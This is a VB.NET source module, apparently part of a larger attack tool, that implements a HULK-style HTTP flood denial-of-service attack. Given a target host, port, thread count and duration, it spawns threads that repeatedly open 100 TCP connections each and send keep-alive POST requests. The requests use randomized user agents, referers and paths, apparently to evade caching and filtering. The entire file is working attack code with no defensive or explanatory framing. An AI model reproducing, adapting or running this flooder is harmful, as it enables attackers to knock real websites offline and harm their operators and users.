
Imports System.Text
Imports System.Threading
Imports System.Net.Sockets
Imports System.Net

Public Module hulk

    Private ThreadsEnded = 0
    Private PostDATA As String
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private Ports As Integer
    Private ThreadstoUse As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private Attacks As Integer = 0
    Public Sub StartHulk(ByVal Host As String, ByVal Port As Integer, ByVal Threadsto As Integer, ByVal Time As Integer, ByVal data As String)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = Host
            Ports = Port
            PostDATA = data
            ThreadstoUse = Threadsto
            TimetoAttack = Time

            If HostToAttack.Contains("http://") Then HostToAttack = HostToAttack.Replace("http://", String.Empty)
            If HostToAttack.Contains("www.") Then HostToAttack = HostToAttack.Replace("www.", String.Empty)
            If HostToAttack.Contains("/") Then HostToAttack = HostToAttack.Replace("/", String.Empty)


            Threads = New Thread(Threadsto - 1) {}
            Mainmenu.changeStatus("Hulk attack")
            For i As Integer = 0 To Threadsto - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else
            'Form1.TalktoChannel("A Slowloris Attack is Already Running on " & HostToAttack)
        End If

    End Sub
    Private Sub lol()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            'Form1.TalktoChannel("Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0

        End If

    End Sub

    Public Sub StopHulk()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            'Form1.TalktoChannel("Slowloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0

        Else
            'Form1.TalktoChannel("No Slowloris Attack is Running!")
        End If
    End Sub
    Private Function headers()
        Dim r As Random = New Random
        Dim array() As String = {"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        }
        Return array(r.Next(0, (array.Length - 1)))
    End Function
    Private Function referer_list()
        Dim r As Random = New Random
        Dim array() As String = {"http://www.google.com/?q=",
            "http://www.usatoday.com/search/results?q=",
            "http://engadget.search.aol.com/search?q=",
            "http://" & HostToAttack & "/"
        }
        Return array(r.Next(0, (array.Length - 1)))
    End Function

    Function buildblock(size)
        Dim out_str
        Dim r As Random = New Random
        For i As Integer = 0 To size
            out_str += Chr(r.Next(110, 120))
        Next
        Return (out_str)
    End Function

    Public Function GenerateRandomString(ByRef len As Integer, ByRef upper As Boolean) As String
        Dim rand As New Random()
        Dim allowableChars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray()
        Dim final As String = String.Empty
        For i As Integer = 0 To len - 1
            final += allowableChars(rand.Next(allowableChars.Length - 1))
        Next

        Return IIf(upper, final.ToUpper(), final)
    End Function

    Private Sub DoWork()
        Dim file As String = ""
        Try
            Dim r As Random = New Random
            Dim socketArray As Socket() = New Socket(100 - 1) {}
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Do While (stopwatch.Elapsed < span)
                Try
                    Dim i As Integer

                    For i = 0 To 100 - 1
                        If Mainmenu.Append_chchbox.Checked Then
                            file = GenerateRandomString(5, True)
                        End If
                        socketArray(i) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                        socketArray(i).Connect(Dns.GetHostAddresses(HostToAttack), Ports)
                        socketArray(i).Send(ASCIIEncoding.Default.GetBytes("POST /" & file & " HTTP/1.1" & ChrW(13) & ChrW(10) & "Host: " & HostToAttack.ToString() & ChrW(13) & ChrW(10) & "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" & ChrW(13) & ChrW(10) & "Cache-Control: no-cache" & ChrW(13) & ChrW(10) & "Referer: " & referer_list() & buildblock(r.Next(5, 10)) & ChrW(13) & ChrW(10) & "Keep-Alive: " & r.Next(110, 120) & ChrW(13) & ChrW(10) & "Connection: keep-alive" & ChrW(13) & ChrW(10) & "User-Agent: " & headers() & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)), SocketFlags.None)
                        Attacks = Attacks + 1


                    Next i
                    Dim j As Integer
                    For j = 0 To 100 - 1
                        socketArray(j).Close()
                    Next j
                    Continue Do



                Catch

                    Continue Do
                End Try
            Loop
        Catch : End Try
        lol()
    End Sub
End Module
